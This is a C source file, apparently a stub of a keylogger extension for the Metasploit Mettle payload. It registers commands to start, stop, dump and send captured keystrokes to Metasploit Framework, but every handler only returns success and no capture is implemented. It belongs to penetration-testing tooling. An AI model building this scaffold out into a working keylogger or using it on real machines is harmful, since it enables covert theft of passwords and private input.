/**
 * Copyright 2018 Rapid7
 * @brief keylogger extension source file
 * @file keylogger.c
 */

#include "extension.h"
#include "keylogger.h"

#define DEBUG

/*
 * *** TLV COMMAND HANDLERS ***
 */

/*
 * Start capturing keypresses.
 */
static struct tlv_packet *request_capture_start(struct tlv_handler_ctx *ctx)
{
	int tlv_result = TLV_RESULT_FAILURE;
	struct tlv_packet *r = tlv_packet_response(ctx);

	tlv_result = TLV_RESULT_SUCCESS;

//done:
	r = tlv_packet_add_result(r, tlv_result);
	return r;
}

/*
 * Stop capturing keypresses.
 */
static struct tlv_packet *request_capture_stop(struct tlv_handler_ctx *ctx)
{
	int tlv_result = TLV_RESULT_FAILURE;
	struct tlv_packet *r = tlv_packet_response(ctx);

	tlv_result = TLV_RESULT_SUCCESS;

//done:
	r = tlv_packet_add_result(r, tlv_result);
	return r;
}

/*
 * Return current keylogging status.
 */
static struct tlv_packet *request_capture_status(struct tlv_handler_ctx *ctx)
{
	int tlv_result = TLV_RESULT_FAILURE;
	struct tlv_packet *r = tlv_packet_response(ctx);

	tlv_result = TLV_RESULT_SUCCESS;

//done:
	r = tlv_packet_add_result(r, tlv_result);
	return r;
}

/*
 * Discard/drop all captured keylog data.
 */
static struct tlv_packet *request_capture_release(struct tlv_handler_ctx *ctx)
{
	int tlv_result = TLV_RESULT_FAILURE;
	struct tlv_packet *r = tlv_packet_response(ctx);

	tlv_result = TLV_RESULT_SUCCESS;

//done:
	r = tlv_packet_add_result(r, tlv_result);
	return r;
}

/*
 * Take captured keylogging data and ready it for
 * sending over to Metasploit Framework.
 */
static struct tlv_packet *request_capture_dump(struct tlv_handler_ctx *ctx)
{
	int tlv_result = TLV_RESULT_FAILURE;
	struct tlv_packet *r = tlv_packet_response(ctx);

	tlv_result = TLV_RESULT_SUCCESS;
//done:
	r = tlv_packet_add_result(r, tlv_result);
	return r;
}

/*
 * Returned the 'dumped' captured keylog data to Framework.
 */
static struct tlv_packet *request_capture_dump_read(struct tlv_handler_ctx *ctx)
{
	int tlv_result = TLV_RESULT_FAILURE;
	struct tlv_packet *r = tlv_packet_response(ctx);

	tlv_result = TLV_RESULT_SUCCESS;

//done:
	r = tlv_packet_add_result(r, tlv_result);
	return r;
}

/*
 * Extension is shutting down, stop-and-release all the things.
 */
static void keylogger_free()
{
}

/*
 * Keylogging module starts here!
 */
int main(void)
{
	int ret_val;

#ifdef DEBUG
	extension_log_to_mettle(EXTENSION_LOG_LEVEL_INFO);
#endif

	struct extension *e = extension();

	// Register the commands and assocaited handlers this extension provides.
	extension_add_handler(e, "keylogger_capture_start", request_capture_start, NULL);
	extension_add_handler(e, "keylogger_capture_stop", request_capture_stop, NULL);
	extension_add_handler(e, "keylogger_capture_status", request_capture_status, NULL);
	extension_add_handler(e, "keylogger_capture_release", request_capture_release, NULL);
	extension_add_handler(e, "keylogger_capture_dump", request_capture_dump, NULL);
	extension_add_handler(e, "keylogger_capture_dump_read", request_capture_dump_read, NULL);

	// Ready to go!
	extension_start(e);

	// On the way out now, let's wind things down...
	extension_free(e);
	keylogger_free();

	return 0;
}
